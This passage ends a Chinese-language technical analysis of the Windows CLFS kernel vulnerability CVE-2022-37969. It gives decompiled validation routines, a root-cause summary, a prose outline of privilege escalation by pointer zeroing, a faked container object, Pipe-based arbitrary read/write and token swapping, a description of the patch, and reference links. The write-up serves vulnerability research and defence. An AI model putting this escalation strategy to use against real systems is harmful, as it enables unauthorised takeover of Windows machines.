style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>v10;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>.....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a3<span style="color:#f92672">+</span> v5<span style="color:#f92672">+</span><span style="color:#ae81ff">78</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">0xFFFFFFFD</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v4;</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(this, v8<span style="color:#f92672">+</span><span style="color:#ae81ff">135</span>, a3);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(v9, v8<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>, v10);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">OffsetToAddr</span>(this, v8);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v11 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(v11<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12<span style="color:#f92672">!=</span> v8 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(v11<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">!=</span> v12<span style="color:#f92672">+</span><span style="color:#ae81ff">136</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(this, v8, v5,<span style="color:#f92672">&amp;</span>v19);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)v19<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">!=</span> (_DWORD)v5 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v19<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1040322553</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> Buffer<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a3<span style="color:#f92672">+</span> v5<span style="color:#f92672">+</span><span style="color:#ae81ff">78</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>;</span></span><span style="display:flex;"><span> inserted<span style="color:#f92672">=</span><span style="color:#a6e22e">RtlInsertElementGenericTableAvl</span>(a2,<span style="color:#f92672">&amp;</span>Buffer,<span style="color:#ae81ff">8u</span>,<span style="color:#f92672">&amp;</span>NewElement);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NewElement<span style="color:#f92672">||</span><span style="color:#f92672">!</span>inserted )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v5<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x7C</span> );</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v4<span style="color:#f92672">!=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ClientCount</span>(this) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Symbol;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><code>CClfsBaseFile::ValidateCheckifWithinSymbolZone</code>函数检查<code>cbSymbolZone</code>偏移是否处于政策范围内（处于BASE_RECORD_HEADER和BASE_RECORD之间）</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x1338</span><span style="color:#f92672">||</span> a2<span style="color:#f92672">-</span><span style="color:#ae81ff">4920</span><span style="color:#f92672">></span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a3<span style="color:#f92672">+</span><span style="color:#ae81ff">1226</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="小结">小结</h3><p>这次漏洞的造成原因是自身的<code>SignatureOffset</code>和自身的<code>Signatures</code>相交，导致攻击者可以利用循环写入<code>Signatures</code>的时候覆盖<code>SignatureOffset</code>，从而绕过<code>ResetLog</code>中的边界检查，同时未检查<code>BASE_RECORD_HEADER</code> + cbSymbolZone是否位于当前的<code>BASE_RECORD</code>中，导致攻击者可以利用漏洞通过memset函数对任意地址的一定大小的内存进行清零。</p><p>在实际利用中通过清零pContainer指针的高五位同时在用户层通过堆布局伪造CClfsContainer对象，在解引用对象指针时获取到执行代码的时机。通过结合Pipe对象和内核的两个函数成功获得任意读和任意写，从而成功将当前进程的Token替换成系统进程的token，达成提权。利用过程</p><p>在漏洞补丁中增加了对<code>cbSymbolZone</code>和<code>Client Context</code>的检查从而在漏洞利用初期阻断。</p><p>总的来说该漏洞形成原因是代码调用某些函数时未检查边界且该边界用户可控或间接可控。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://github.com/fortra/CVE-2022-37969" target="_blank">https://github.com/fortra/CVE-2022-37969</a></p><p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis" target="_blank">https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis</a></p><p><a href="https://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A" target="_blank">https://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A</a></p><p><a href="https://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0" target="_blank">https://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0</a></p><p><a href="https://www.geoffchappell.com/" target="_blank">https://www.geoffchappell.com/</a></p><p><a href="https://github.com/ionescu007/clfs-docs" target="_blank">https://github.com/ionescu007/clfs-docs</a></p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf" target="_blank">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p><p><a href="https://www.52pojie.cn/thread-1817452-1-1.html" target="_blank">https://www.52pojie.cn/thread-1817452-1-1.html</a></p></blockquote><p><strong>Created at 2023-05-26T10:56:00+08:00</strong></p></description></item></channel></rss>